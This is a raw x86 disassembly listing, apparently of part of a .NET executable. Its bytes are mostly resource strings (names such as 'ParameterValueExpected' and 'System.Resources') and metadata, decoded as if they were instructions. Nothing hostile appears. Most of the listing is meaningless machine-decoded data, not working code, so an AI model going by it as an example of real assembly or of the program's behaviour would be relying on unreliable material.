  407dc3:	add    BYTE PTR [ebp+0x0],ah
  407dc6:	je     0x407dc8
  407dc8:	add    BYTE PTR gs:[eax+eax*1+0x0],ah
  407dcd:	pop    ds
  407dce:	inc    ebx
  407dcf:	add    BYTE PTR [edi+0x0],ch
  407dd2:	ins    DWORD PTR es:[edi],dx
  407dd3:	add    BYTE PTR [ebp+0x0],ch
  407dd6:	popa   
  407dd7:	add    BYTE PTR [esi+0x0],ch
  407dda:	add    BYTE PTR fs:[eax+eax*1+0x69],cl
  407ddf:	add    BYTE PTR [esi+0x0],ch
  407de2:	add    BYTE PTR gs:[eax+0x0],cl
  407de6:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  407deb:	add    BYTE PTR [eax],al
  407ded:	das    
  407dee:	inc    ebx
  407def:	add    BYTE PTR [edi+0x0],ch
  407df2:	ins    DWORD PTR es:[edi],dx
  407df3:	add    BYTE PTR [ebp+0x0],ch
  407df6:	popa   
  407df7:	add    BYTE PTR [esi+0x0],ch
  407dfa:	add    BYTE PTR fs:[eax+0x0],dl
  407dfe:	jb     0x407e00
  407e00:	outs   dx,DWORD PTR ds:[esi]
  407e01:	add    BYTE PTR [ebx+0x0],ah
  407e04:	add    BYTE PTR gs:[ebx+0x0],dh
  407e08:	jae    0x407e0a
  407e0a:	imul   eax,DWORD PTR [eax],0x67006e
  407e10:	inc    esi
  407e11:	add    BYTE PTR [ecx+0x0],ah
  407e14:	imul   eax,DWORD PTR [eax],0x65006c
  407e1a:	add    BYTE PTR fs:[eax],al
  407e1d:	sub    DWORD PTR [eax+eax*1+0x6e],eax
  407e21:	add    BYTE PTR [ebx+0x0],dh
  407e24:	dec    esi
  407e25:	add    BYTE PTR [ecx+0x0],ah
  407e28:	ins    DWORD PTR es:[edi],dx
  407e29:	add    BYTE PTR [ebp+0x0],ah
  407e2c:	jae    0x407e2e
  407e2e:	dec    esi
  407e2f:	add    BYTE PTR [edi+0x0],ch
  407e32:	je     0x407e34
  407e34:	push   ebx
  407e35:	add    BYTE PTR [ebp+0x0],dh
  407e38:	jo     0x407e3a
  407e3a:	jo     0x407e3c
  407e3c:	outs   dx,DWORD PTR ds:[esi]
  407e3d:	add    BYTE PTR [edx+0x0],dh
  407e40:	je     0x407e42
  407e42:	add    BYTE PTR gs:[eax+eax*1+0x0],ah
  407e47:	sub    eax,0x720045
  407e4c:	jb     0x407e4e
  407e4e:	outs   dx,DWORD PTR ds:[esi]
  407e4f:	add    BYTE PTR [edx+0x0],dh
  407e52:	push   edx
  407e53:	add    BYTE PTR [ebp+0x0],ah
  407e56:	jno    0x407e58
  407e58:	jne    0x407e5a
  407e5a:	imul   eax,DWORD PTR [eax],0x650072
  407e60:	jae    0x407e62
  407e62:	inc    ebp
  407e63:	add    BYTE PTR [eax+eax*1+0x65],ch
  407e67:	add    BYTE PTR [esi+0x0],dh
  407e6a:	popa   
  407e6b:	add    BYTE PTR [eax+eax*1+0x69],dh
  407e6f:	add    BYTE PTR [edi+0x0],ch
  407e72:	outs   dx,BYTE PTR ds:[esi]
  407e73:	add    BYTE PTR [eax],al
  407e75:	sbb    eax,0x6e0049
  407e7a:	jbe    0x407e7c
  407e7c:	popa   
  407e7d:	add    BYTE PTR [eax+eax*1+0x69],ch
  407e81:	add    BYTE PTR [eax+eax*1+0x43],ah
  407e85:	add    BYTE PTR [edi+0x0],ch
  407e88:	ins    DWORD PTR es:[edi],dx
  407e89:	add    BYTE PTR [ebp+0x0],ch
  407e8c:	popa   
  407e8d:	add    BYTE PTR [esi+0x0],ch
  407e90:	add    BYTE PTR fs:[eax],al
  407e93:	sub    edx,DWORD PTR [eax+0x0]
  407e96:	popa   
  407e97:	add    BYTE PTR [edx+0x0],dh
  407e9a:	popa   
  407e9b:	add    BYTE PTR [ebp+0x0],ch
  407e9e:	add    BYTE PTR gs:[eax+eax*1+0x65],dh
  407ea3:	add    BYTE PTR [edx+0x0],dh
  407ea6:	push   ebp
  407ea7:	add    BYTE PTR [esi+0x0],ch
  407eaa:	jb     0x407eac
  407eac:	add    BYTE PTR gs:[ebx+0x0],ah
  407eb0:	outs   dx,DWORD PTR ds:[esi]
  407eb1:	add    BYTE PTR [edi+0x0],ah
  407eb4:	outs   dx,BYTE PTR ds:[esi]
  407eb5:	add    BYTE PTR [ecx+0x0],ch
  407eb8:	jp     0x407eba
  407eba:	add    BYTE PTR gs:[eax+eax*1+0x0],ah
  407ebf:	sub    eax,0x610050
  407ec4:	jb     0x407ec6
  407ec6:	popa   
  407ec7:	add    BYTE PTR [ebp+0x0],ch
  407eca:	add    BYTE PTR gs:[eax+eax*1+0x65],dh
  407ecf:	add    BYTE PTR [edx+0x0],dh
  407ed2:	push   esi
  407ed3:	add    BYTE PTR [ecx+0x0],ah
  407ed6:	ins    BYTE PTR es:[edi],dx
  407ed7:	add    BYTE PTR [ebp+0x0],dh
  407eda:	add    BYTE PTR gs:[ebp+0x0],al
  407ede:	js     0x407ee0
  407ee0:	jo     0x407ee2
  407ee2:	add    BYTE PTR gs:[ebx+0x0],ah
  407ee6:	je     0x407ee8
  407ee8:	add    BYTE PTR gs:[eax+eax*1+0x0],ah
  407eed:	xor    DWORD PTR [eax+0x0],edx
  407ef0:	popa   
  407ef1:	add    BYTE PTR [edx+0x0],dh
  407ef4:	popa   
  407ef5:	add    BYTE PTR [ebp+0x0],ch
  407ef8:	add    BYTE PTR gs:[eax+eax*1+0x65],dh
  407efd:	add    BYTE PTR [edx+0x0],dh
  407f00:	push   esi
  407f01:	add    BYTE PTR [ecx+0x0],ah
  407f04:	ins    BYTE PTR es:[edi],dx
  407f05:	add    BYTE PTR [ebp+0x0],dh
  407f08:	add    BYTE PTR gs:[ebp+0x0],dl
  407f0c:	outs   dx,BYTE PTR ds:[esi]
  407f0d:	add    BYTE PTR [ebp+0x0],ah
  407f10:	js     0x407f12
  407f12:	jo     0x407f14
  407f14:	add    BYTE PTR gs:[ebx+0x0],ah
  407f18:	je     0x407f1a
  407f1a:	add    BYTE PTR gs:[eax+eax*1+0x0],ah
  407f1f:	and    eax,0x750053
  407f24:	add    BYTE PTR [bx+0x0],ah
  407f28:	add    BYTE PTR gs:[ebx+0x0],dh
  407f2c:	je     0x407f2e
  407f2e:	dec    ebp
  407f2f:	add    BYTE PTR [edi+0x0],ch
  407f32:	jb     0x407f34
  407f34:	add    BYTE PTR gs:[eax+eax*1+0x65],al
  407f39:	add    BYTE PTR [eax+eax*1+0x61],dh
  407f3d:	add    BYTE PTR [ecx+0x0],ch
  407f40:	ins    BYTE PTR es:[edi],dx
  407f41:	add    BYTE PTR [ebx+0x0],dh
  407f44:	add    BYTE PTR ds:0x5c005c,al
  407f4a:	add    BYTE PTR [ecx],cl
  407f4c:	pop    ebx
  407f4d:	add    BYTE PTR [eax+eax*1+0x64],bl
  407f51:	add    BYTE PTR [ebp+0x0],bl
  407f54:	add    BYTE PTR [ebx],cl
  407f56:	pop    ebx
  407f57:	add    BYTE PTR [ecx+0x0],ah
  407f5a:	sub    eax,0x5d007a00
  407f5f:	add    BYTE PTR [ecx],al
  407f61:	or     ebx,DWORD PTR [ebx+0x0]
  407f64:	inc    ecx
  407f65:	add    BYTE PTR ds:0x5d005a00,ch
  407f6b:	add    BYTE PTR [ecx],al
  407f6d:	or     eax,0x5c005b
  407f72:	push   edi
  407f73:	add    BYTE PTR [eax+eax*1+0x5f],bh
  407f77:	add    BYTE PTR [ebp+0x0],bl
  407f7a:	add    BYTE PTR [ebx],al
  407f7c:	pop    esp
  407f7d:	add    BYTE PTR [eax],al
  407f7f:	add    esp,DWORD PTR ds:0x5e230000
  407f85:	add    BYTE PTR [eax+eax*1+0x5c],bl
  407f89:	add    BYTE PTR [eax],ch
  407f8b:	add    BYTE PTR [eax+eax*1+0x5c],bl
  407f8f:	add    BYTE PTR [esi],ch
  407f91:	add    BYTE PTR [ebx],ch
  407f93:	add    BYTE PTR [ecx],ch
  407f95:	add    BYTE PTR [ebx+0x0],bh
  407f98:	xor    al,BYTE PTR [eax]
  407f9a:	sub    al,0x0
  407f9c:	jge    0x407f9e
  407f9e:	pop    esp
  407f9f:	add    BYTE PTR [eax+eax*1+0x3f],bl
  407fa3:	add    BYTE PTR [eax+eax*1],ah
  407fa6:	add    BYTE PTR [ebx],al
  407fa8:	jbe    0x407faa
  407faa:	add    BYTE PTR [eax],al
  407fac:	adc    al,0x25
  407fae:	cmp    al,0xd0
  407fb0:	add    eax,0xb84c2641
  407fb5:	pop    esp
  407fb6:	int3   
  407fb7:	dec    ebp
  407fb8:	mov    cl,0x8c
  407fba:	inc    ebx
  407fbb:	mov    eax,DWORD PTR [eax]
  407fbd:	or     BYTE PTR [edi+0x19565c7a],dh
  407fc3:	xor    al,0xe0
  407fc5:	mov    DWORD PTR [edx],eax
  407fc7:	push   es
  407fc8:	push   cs
  407fc9:	add    al,BYTE PTR [esi]
  407fcb:	add    al,BYTE PTR [ebx]
  407fcd:	and    BYTE PTR [eax],al
  407fcf:	add    DWORD PTR ds:0xe010200,eax
  407fd5:	add    al,BYTE PTR [ebx]
  407fd7:	add    BYTE PTR [eax],al
  407fd9:	sbb    BYTE PTR [ebx],al
  407fdb:	add    BYTE PTR [eax],al
  407fdd:	push   cs
  407fde:	or     BYTE PTR [ecx],dh
  407fe0:	mov    edi,0x36ad5638
  407fe5:	dec    esi
  407fe6:	xor    eax,0x12000004
  407feb:	adc    eax,0x1010005
  407ff0:	adc    bl,BYTE PTR [ecx]
  407ff2:	add    eax,0x1d010100
  407ff7:	push   cs
  407ff8:	add    eax,DWORD PTR [eax]
  407ffa:	add    BYTE PTR [ecx],al
  407ffc:	add    al,0x0
  407ffe:	add    DWORD PTR [ecx],eax
  408000:	push   cs
  408001:	or     DWORD PTR [eax],eax
  408003:	add    dl,BYTE PTR [edx]
  408005:	or     BYTE PTR ds:0x812100e,bl
  40800b:	or     DWORD PTR [eax],eax
  40800d:	add    al,0xe
  40800f:	sbb    eax,0xe08100e
  408014:	push   cs
  408015:	add    eax,0xe010200
  40801a:	push   cs
  40801b:	or     eax,DWORD PTR [eax]
  40801d:	add    al,0x8
  40801f:	push   cs
  408020:	adc    BYTE PTR [ecx],dl
  408022:	sbb    al,0x11
  408024:	sbb    eax,0xa1c10
  408029:	add    al,0x8
  40802b:	sbb    BYTE PTR [ecx],dl
  40802d:	sbb    eax,0x1c101d11
  408032:	add    al,BYTE PTR [esi]
  408034:	or     BYTE PTR [ebx],al
  408036:	push   es
  408037:	adc    DWORD PTR [eax],ebx
  408039:	add    al,0x1
  40803b:	add    BYTE PTR [eax],al
  40803d:	add    BYTE PTR [edx+eax*1],al
  408040:	add    BYTE PTR [eax],al
  408042:	add    BYTE PTR [esp+eax*1],al
  408045:	add    BYTE PTR [eax],al
  408047:	add    BYTE PTR [eax+ecx*1],al
  40804a:	add    BYTE PTR [eax],al
  40804c:	add    BYTE PTR [eax+edx*1],al
  40804f:	add    BYTE PTR [eax],al
  408051:	add    BYTE PTR [eax+eiz*1],al
  408054:	add    BYTE PTR [eax],al
  408056:	add    BYTE PTR [eax+eax*2],al
  408059:	add    BYTE PTR [eax],al
  40805b:	add    BYTE PTR [eax+eax*4],al
  40805e:	add    BYTE PTR [eax],al
  408060:	add    BYTE PTR [eax+eax*1],al
  408063:	add    DWORD PTR [eax],eax
  408065:	add    BYTE PTR [eax+eax*1],al
  408068:	add    al,BYTE PTR [eax]
  40806a:	add    BYTE PTR [eax+eax*1],al
  40806d:	add    al,0x0
  40806f:	add    BYTE PTR [eax+eax*1],al
  408072:	or     BYTE PTR [eax],al
  408074:	add    BYTE PTR [eax+eax*1],al
  408077:	adc    BYTE PTR [eax],al
  408079:	add    BYTE PTR [eax+eax*1],al
  40807c:	and    BYTE PTR [eax],al
  40807e:	add    BYTE PTR [eax+eax*1],al
  408081:	inc    eax
  408082:	add    BYTE PTR [eax],al
  408084:	add    al,0x0
  408086:	add    BYTE PTR [eax],0x0
  408089:	add    al,0x0
  40808b:	add    BYTE PTR [ecx],al
  40808d:	add    BYTE PTR [eax+eax*1],al
  408090:	add    BYTE PTR [edx],al
  408092:	add    BYTE PTR [ebx+eax*1],al
  408095:	add    BYTE PTR [eax],al
  408097:	add    BYTE PTR [edx*1+0x4000000],al
  40809e:	pop    ss
  40809f:	add    BYTE PTR [eax],al
  4080a1:	add    BYTE PTR [edx],al
  4080a3:	push   es
  4080a4:	or     DWORD PTR [edx],eax
  4080a6:	push   es
  4080a7:	sbb    al,0x2
  4080a9:	push   es
  4080aa:	sbb    BYTE PTR [ebx],al
  4080ac:	and    BYTE PTR [eax],al
  4080ae:	or     BYTE PTR [esi],al
  4080b0:	and    BYTE PTR [edx],al
  4080b2:	adc    ah,BYTE PTR [ecx]
  4080b4:	or     BYTE PTR [eax],cl
  4080b6:	or     al,0x20
  4080b8:	add    eax,0x1d111008
  4080bd:	sbb    eax,0x1d08080e
  4080c2:	or     BYTE PTR [ebx],dl
  4080c4:	and    BYTE PTR [eax],cl
  4080c6:	or     BYTE PTR [eax],cl
  4080c8:	adc    BYTE PTR [ecx],dl
  4080ca:	sbb    eax,0x11100808
  4080cf:	and    eax,0x11101c1d
  4080d4:	sub    DWORD PTR ds:0x12060318,ebx
  4080da:	sub    eax,0x31120603
  4080df:	add    al,0x0
  4080e1:	add    BYTE PTR [edx],dl
  4080e3:	sub    eax,0x12000004
  4080e8:	xor    DWORD PTR ds:0x12010100,eax
  4080ee:	xor    DWORD PTR [eax+ecx*1],eax
  4080f1:	add    BYTE PTR [edx],dl
  4080f3:	sub    eax,0x12000804
  4080f8:	xor    DWORD PTR [ebx],eax
  4080fa:	or     BYTE PTR [eax],al
  4080fc:	push   cs
  4080fd:	add    al,0x0
  4080ff:	add    BYTE PTR [edx],dl
  408101:	sub    BYTE PTR [eax+eiz*1],al
  408104:	add    DWORD PTR [ecx],eax
  408106:	push   cs
  408107:	add    al,0x20
  408109:	add    DWORD PTR [ecx],eax
  40810b:	or     BYTE PTR [edi],al
  40810d:	and    BYTE PTR [ebx],al
  40810f:	add    DWORD PTR ds:0x5080805,ebx
  408115:	and    BYTE PTR [edx],al
  408117:	add    DWORD PTR [edx+eax*1],ebx
  40811a:	add    eax,0x1e000130
  40811f:	add    BYTE PTR [ebx],al
  408121:	and    BYTE PTR [eax],al
  408123:	add    al,BYTE PTR [eax+ecx*1]
  408126:	add    BYTE PTR [edx],dl
  408128:	sub    BYTE PTR [eax+eiz*1],al
  40812b:	add    DWORD PTR [ecx],eax
  40812d:	sbb    BYTE PTR [ebx],al
  40812f:	and    BYTE PTR [eax],al
  408131:	sbb    BYTE PTR [eax+eax*1],al
  408134:	add    DWORD PTR [eax],ecx
  408136:	sbb    BYTE PTR [ebx],al
  408138:	sub    BYTE PTR [eax],al
  40813a:	sbb    BYTE PTR [eax+eax*1],al
  40813d:	add    BYTE PTR [eax],al
  40813f:	add    BYTE PTR [eax*8+0x4000008],al
  408146:	(bad)
  40814a:	add    al,0x90
  40814c:	or     al,BYTE PTR [eax]
  40814e:	add    BYTE PTR [ecx+edx*4],al
  408151:	or     al,BYTE PTR [eax]
  408153:	add    BYTE PTR [eax+eiz*1],al
  408156:	add    al,BYTE PTR [eax]
  408158:	add    BYTE PTR [esi],al
  40815a:	add    BYTE PTR [edx],al
  40815c:	adc    DWORD PTR [esi+ecx*1+0xe],esp
  408160:	add    al,0x0
  408162:	add    DWORD PTR [edx],eax
  408164:	push   cs
  408165:	pop    es
  408166:	add    BYTE PTR [ebx],al
  408168:	add    cl,BYTE PTR [esi]
  40816a:	push   cs
  40816b:	adc    BYTE PTR [edx],al
  40816d:	add    eax,DWORD PTR [eax]
  40816f:	add    BYTE PTR [edx],al
  408171:	push   es
  408172:	add    BYTE PTR [ecx],al
  408174:	adc    dh,BYTE PTR ds:0x62c12
  40817a:	add    eax,DWORD PTR [edx]
  40817c:	push   cs
  40817d:	push   cs
  40817e:	push   cs
  40817f:	or     DWORD PTR [eax],eax
  408181:	add    al,0x12
  408183:	sub    al,0xe
  408185:	push   cs
  408186:	add    dl,BYTE PTR [eax]
  408188:	push   cs
  408189:	pop    es
  40818a:	add    BYTE PTR [ebx],al
  40818c:	adc    ch,BYTE PTR [esi+ecx*1]
  40818f:	push   cs
  408190:	add    al,BYTE PTR [esi]
  408192:	add    BYTE PTR [edx],al
  408194:	push   cs
  408195:	push   cs
  408196:	adc    BYTE PTR [edx],al
  408198:	add    eax,0x120e0100
  40819d:	sub    BYTE PTR ds:0x12020100,al
  4081a3:	cmp    DWORD PTR [esi],eax
  4081a5:	add    BYTE PTR [edx],al
  4081a7:	add    bl,BYTE PTR [eax]
  4081a9:	adc    bh,BYTE PTR [ecx]
  4081ab:	add    eax,0x12020100
  4081b0:	cmp    eax,0x34110603
  4081b5:	add    eax,DWORD PTR [esi]
  4081b7:	adc    DWORD PTR [eax],edi
  4081b9:	add    al,0x5
  4081bb:	add    BYTE PTR [eax],al
  4081bd:	add    BYTE PTR [esi+eax*1],al
  4081c0:	add    BYTE PTR [eax],al
  4081c2:	add    BYTE PTR [edi+eax*1],al
  4081c5:	add    BYTE PTR [eax],al
  4081c7:	add    BYTE PTR [ecx+ecx*1],al
  4081ca:	add    BYTE PTR [eax],al
  4081cc:	add    BYTE PTR [ebx],al
  4081ce:	push   es
  4081cf:	adc    DWORD PTR [ebx+eax*1+0x6],ecx
  4081d3:	adc    DWORD PTR [eax+0x3],ecx
  4081d6:	push   es
  4081d7:	adc    DWORD PTR [ebx+eax*1+0x6],eax
  4081db:	adc    DWORD PTR [eax+0x3],edx
  4081de:	push   es
  4081df:	adc    ch,BYTE PTR [eax]
  4081e1:	add    al,BYTE PTR [esi]
  4081e3:	add    eax,0x5c110603
  4081e8:	or     eax,DWORD PTR [eax]
  4081ea:	add    eax,0x10091802
  4081ef:	adc    DWORD PTR [ecx+ecx*1],esi
  4081f2:	adc    BYTE PTR [ecx],cl
  4081f4:	or     eax,DWORD PTR [eax]
  4081f6:	push   es
  4081f7:	add    cl,BYTE PTR [esi]
  4081f9:	push   cs
  4081fa:	push   cs
  4081fb:	or     BYTE PTR [eax],cl
  4081fd:	adc    BYTE PTR [edx],dl
  4081ff:	sub    al,0x10
  408201:	add    BYTE PTR [edi],al
  408203:	add    cl,BYTE PTR [esi]
  408205:	push   cs
  408206:	adc    ch,BYTE PTR [eax]
  408208:	adc    BYTE PTR [eax],cl
  40820a:	adc    al,BYTE PTR [ecx+0x10]
  40820d:	or     BYTE PTR [eax],dl
  40820f:	adc    DWORD PTR [eax],edi
  408211:	adc    DWORD PTR [eax],eax
  408213:	pop    es
  408214:	add    cl,BYTE PTR [esi]
  408216:	adc    ch,BYTE PTR [eax]
  408218:	adc    al,BYTE PTR [ecx+0x10]
  40821b:	or     BYTE PTR [edx],dl
  40821d:	inc    ecx
  40821e:	adc    BYTE PTR [eax],cl
  408220:	adc    BYTE PTR [ecx],dl
  408222:	cmp    BYTE PTR [edx],cl
  408224:	add    BYTE PTR ds:0x80e0e08,al
  40822a:	adc    BYTE PTR [ecx],dl
  40822c:	push   esp
  40822d:	or     BYTE PTR [eax],cl
  40822f:	add    BYTE PTR [eax+ecx*1],al
  408232:	push   cs
  408233:	push   cs
  408234:	or     BYTE PTR [eax],dl
  408236:	sbb    BYTE PTR ds:0xe080200,al
  40823c:	push   cs
  40823d:	or     eax,DWORD PTR [eax]
  40823f:	add    eax,0x11180e09
  408244:	push   eax
  408245:	adc    BYTE PTR [ecx],dl
  408247:	cmp    al,0x18
  408249:	str    WORD PTR [ebx]
  40824c:	add    bl,BYTE PTR [eax]
  40824e:	add    eax,0x8080808
  408253:	or     BYTE PTR [eax],cl
  408255:	or     BYTE PTR [eax],cl
  408257:	adc    BYTE PTR [eax],bl
  408259:	pop    es
  40825a:	add    BYTE PTR [ebx],al
  40825c:	add    bl,BYTE PTR [eax]
  40825e:	sbb    BYTE PTR [eax],dl
  408260:	add    al,BYTE PTR [eax+eax*1]
  408263:	add    DWORD PTR [eax],ebx
  408265:	sbb    BYTE PTR [edi],al
  408267:	add    BYTE PTR [ebx],al
  408269:	add    bl,BYTE PTR [eax]
  40826b:	or     BYTE PTR [eax],dl
  40826d:	sbb    BYTE PTR [eax+eax*1],al
  408270:	add    DWORD PTR [edx],eax
  408272:	sbb    BYTE PTR [ecx],cl
  408274:	add    BYTE PTR [ebx],al
  408276:	add    dl,BYTE PTR [ecx]
  408278:	pop    esp
  408279:	adc    al,BYTE PTR [ecx+0x10]
  40827c:	or     BYTE PTR [ebx],al
  40827e:	push   es
  40827f:	adc    DWORD PTR [edx+eiz*1+0x5e],esp
  408283:	add    BYTE PTR [eax+eax*1+0x5c],bl
  408287:	add    BYTE PTR [eax],ch
  408289:	add    BYTE PTR [eax+eax*1+0x5c],bl
  40828d:	add    BYTE PTR [esi],ch
  40828f:	add    BYTE PTR [ebx],ch
  408291:	add    BYTE PTR [ecx],ch
  408293:	add    BYTE PTR [ebx+0x0],bh
  408296:	xor    al,BYTE PTR [eax]
  408298:	sub    al,0x0
  40829a:	jge    0x40829c
  40829c:	pop    esp
  40829d:	add    BYTE PTR [eax+eax*1+0x3f],bl
  4082a1:	add    BYTE PTR [eax+eax*1],ah
  4082a4:	push   es
  4082a5:	add    BYTE PTR [edx],al
  4082a7:	add    cl,BYTE PTR [esi]
  4082a9:	adc    BYTE PTR [edx],al
  4082ab:	push   cs
  4082ac:	add    BYTE PTR [edi],al
  4082ae:	add    cl,BYTE PTR [esi]
  4082b0:	add    al,BYTE PTR [edx]
  4082b2:	adc    BYTE PTR [esi],cl
  4082b4:	adc    BYTE PTR [edx],al
  4082b6:	adc    BYTE PTR [edx],al
  4082b8:	adc    BYTE PTR [edx],al
  4082ba:	push   es
  4082bb:	add    BYTE PTR [edx],al
  4082bd:	add    cl,BYTE PTR [esi]
  4082bf:	adc    BYTE PTR [esi],cl
  4082c1:	or     DWORD PTR [eax],eax
  4082c3:	add    al,0x8
  4082c5:	push   cs
  4082c6:	push   cs
  4082c7:	or     DWORD PTR [eax],edx
  4082c9:	adc    ch,BYTE PTR [eax*1+0x11010120]
  4082d0:	dec    ecx
  4082d1:	add    DWORD PTR ds:0x19012b01,edx
  4082d7:	add    DWORD PTR [eax],ecx
  4082d9:	add    ch,BYTE PTR [edx]
  4082db:	adc    eax,0x4502a02
  4082e0:	and    BYTE PTR [ecx],al
  4082e2:	add    DWORD PTR [edx],eax
  4082e4:	push   es
  4082e5:	and    BYTE PTR [ecx],al
  4082e7:	add    DWORD PTR [ecx],edx
  4082e9:	add    BYTE PTR [ebp+0x1012006],0x11
  4082f0:	or     BYTE PTR [ebp+0x2400a080],0x0
  4082f7:	add    BYTE PTR [eax+eax*4],al
  4082fa:	add    BYTE PTR [eax],al
  4082fc:	xchg   esp,eax
  4082fd:	add    BYTE PTR [eax],al
  4082ff:	add    BYTE PTR [esi],al
  408301:	add    al,BYTE PTR [eax]
  408303:	add    BYTE PTR [eax],al
  408305:	and    al,0x0
  408307:	add    BYTE PTR [edx+0x53],dl
  40830a:	inc    ecx
  40830b:	xor    DWORD PTR [eax],eax
  40830d:	add    al,0x0
  40830f:	add    BYTE PTR [ecx],al
  408311:	add    BYTE PTR [ecx],al
  408313:	add    BYTE PTR [ebp+0x2e790fc],dh
  408319:	jg     0x408382
  40831b:	xchg   DWORD PTR [esi],ebx
  40831d:	ja     0x408359
  40831f:	(bad)  
  408320:	fimul  WORD PTR [ecx-0x2be237c8]
  408326:	add    bh,BYTE PTR [edx+0x1d20b965]
  40832c:	pusha  
  40832d:	pop    ecx
  40832e:	ds xchg esi,eax
  408330:	les    edx,FWORD PTR [edx-0x6377e19b]
  408336:	sar    DWORD PTR [edi],0x14
  408339:	adc    eax,0xac3fb5eb
  40833e:	adc    DWORD PTR [ecx],esi
  408340:	scas   al,BYTE PTR es:[edi]
  408341:	or     edx,ebx
  408343:	xor    eax,ebp
  408345:	out    dx,al
  408346:	pusha  
  408347:	and    DWORD PTR [edi+0x2d],esp
  40834a:	xchg   edi,eax
  40834b:	sbb    dl,ch
  40834d:	xor    DWORD PTR [eax-0x5ff24252],ebp
  408353:	pop    es
  408354:	das    
  408355:	and    eax,0x6fba7dd8
  40835a:	leave  
  40835b:	paddw  mm3,QWORD PTR [ecx-0x72]
  40835f:	aam    0xda
  408361:	xor    eax,0x8c394ce4
  408366:	inc    ebp
  408367:	inc    ebx
  408368:	pop    es
  408369:	call   0x26c4bf51
  40836e:	adc    al,0x3d
  408370:	scas   al,BYTE PTR es:[edi]
  408371:	leave  
  408372:	cmc    
  408373:	xchg   esi,eax
  408374:	sub    DWORD PTR [edi-0x69],0xffffffc8
  408378:	test   DWORD PTR [edi+0x50],0x645c97e5
  40837f:	loop   0x408399
  408381:	lahf   
  408382:	inc    ebp
  408383:	fdivrp st(4),st
  408385:	imul   ebp,DWORD PTR [edx],0x2b
  408388:	adc    al,BYTE PTR [edi-0x53]
  40838b:	ret    
  40838c:	gs sub esi,ebp
  40838f:	ret    
  408390:	or     BYTE PTR ds:0x4a95d,al
  408396:	add    DWORD PTR [esi],ecx
  408398:	sbb    BYTE PTR [eax+eax*1],al
  40839b:	add    BYTE PTR [edx],dl
  40839d:	cmp    eax,0x1012005
  4083a2:	adc    bh,BYTE PTR ds:0x12020707
  4083a8:	and    BYTE PTR [ebp+0x53912],0x0
  4083af:	adc    al,BYTE PTR [eax+0x2003b1]
  4083b5:	push   cs
  4083b6:	add    eax,0xe0e0220
  4083bb:	push   cs
  4083bc:	or     BYTE PTR [esi],al
  4083be:	adc    eax,0x2bd8012
  4083c3:	push   cs
  4083c4:	or     BYTE PTR [edi],al
  4083c6:	adc    eax,0x2bd8012
  4083cb:	push   cs
  4083cc:	or     BYTE PTR [edi],al
  4083ce:	and    BYTE PTR [edx],al
  4083d0:	add    DWORD PTR [ebx],edx
  4083d2:	add    BYTE PTR [ebx],dl
  4083d4:	add    DWORD PTR [eax],ecx
  4083d6:	and    BYTE PTR [edx],al
  4083d8:	add    dl,BYTE PTR [ebx]
  4083da:	add    BYTE PTR [eax],dl
  4083dc:	adc    eax,DWORD PTR [ecx]
  4083de:	add    al,0x20
  4083e0:	add    DWORD PTR [edx],eax
  4083e2:	push   cs
  4083e3:	add    eax,0xe010220
  4083e8:	push   cs
  4083e9:	add    al,0x0
  4083eb:	add    DWORD PTR [eax],ecx
  4083ed:	add    al,BYTE PTR [esi]
  4083ef:	and    BYTE PTR [ebx],al
  4083f1:	add    DWORD PTR [esi],ecx
  4083f3:	or     BYTE PTR [esi],cl
  4083f5:	add    eax,0xe0e0200
  4083fa:	sbb    al,0xc
  4083fc:	pop    es
  4083fd:	pop    es
  4083fe:	add    al,BYTE PTR [edx]
  408400:	adc    cl,BYTE PTR [eax]
  408402:	adc    dl,BYTE PTR ds:0x80e1912
  408408:	add    eax,0x80120000
  40840d:	int    0x4
  40840f:	add    BYTE PTR [ecx],al
  408411:	push   cs
  408412:	push   cs
  408413:	add    eax,0xe0e0200
  408418:	push   cs
  408419:	push   es
  40841a:	add    BYTE PTR [ebx],al
  40841c:	add    DWORD PTR [esi],ecx
  40841e:	push   cs
  40841f:	add    al,BYTE PTR [edi+eax*1]
  408422:	add    cl,BYTE PTR [esi]
  408424:	push   cs
  408425:	pop    es
  408426:	and    BYTE PTR [edx],al
  408428:	add    DWORD PTR [esi],ecx
  40842a:	adc    DWORD PTR [eax+0x12006dd],eax
  408430:	adc    al,BYTE PTR [eax+0x20050ee1]
  408436:	add    BYTE PTR [edx],dl
  408438:	and    ch,0x6
  40843b:	and    BYTE PTR [ecx],al
  40843d:	adc    al,BYTE PTR [eax+0x20040ee9]
  408443:	add    DWORD PTR [ebx],eax
  408445:	or     BYTE PTR [edi],cl
  408447:	pop    es
  408448:	or     DWORD PTR [esi],ecx
  40844a:	or     BYTE PTR [esi],cl
  40844c:	adc    al,BYTE PTR [eax-0x1e7fed27]
  408452:	push   cs
  408453:	push   cs
  408454:	push   cs
  408455:	or     BYTE PTR [eax],cl
  408457:	add    BYTE PTR [ecx],al
  408459:	adc    al,BYTE PTR [eax-0x67fee0b]
  40845f:	push   es
  408460:	add    BYTE PTR [ecx],al
  408462:	or     BYTE PTR [edx],dl
  408464:	xor    ch,0x4
  408467:	and    BYTE PTR [ecx],al
  408469:	push   cs
  40846a:	push   cs
  40846b:	push   es
  40846c:	pop    es
  40846d:	add    edx,DWORD PTR [ecx]
  40846f:	sbb    al,0xe
  408471:	or     BYTE PTR [esi],al
  408473:	and    BYTE PTR [ecx],al
  408475:	add    DWORD PTR [ecx],edx
  408477:	add    DWORD PTR ds:0x24000129,0x32303030
  408481:	xor    BYTE PTR [eax+esi*1],dh
  408484:	xor    BYTE PTR ds:0x30303030,ch
  40848a:	sub    eax,0x30303030
  40848f:	sub    eax,0x30303043
  408494:	sub    eax,0x30303030
  408499:	xor    BYTE PTR [eax],dh
  40849b:	xor    BYTE PTR [eax],dh
  40849d:	xor    BYTE PTR [eax],dh
  40849f:	xor    al,0x36
  4084a1:	add    BYTE PTR [eax],al
  4084a3:	push   es
  4084a4:	and    BYTE PTR [ecx],al
  4084a6:	add    DWORD PTR [ecx],edx
  4084a8:	adc    DWORD PTR ds:0x1000108,0x0
  4084b2:	add    BYTE PTR [eax+0x1],al
  4084b5:	add    BYTE PTR [ebx],dh
  4084b7:	push   ebx
  4084b8:	jns    0x40852d
  4084ba:	je     0x408521
  4084bc:	ins    DWORD PTR es:[edi],dx
  4084bd:	cs push edx
  4084bf:	gs jae 0x408531
  4084c2:	jne    0x408536
  4084c4:	arpl   WORD PTR [ebp+0x73],sp
  4084c7:	cs push esp
  4084c9:	outs   dx,DWORD PTR ds:[esi]
  4084ca:	outs   dx,DWORD PTR ds:[esi]
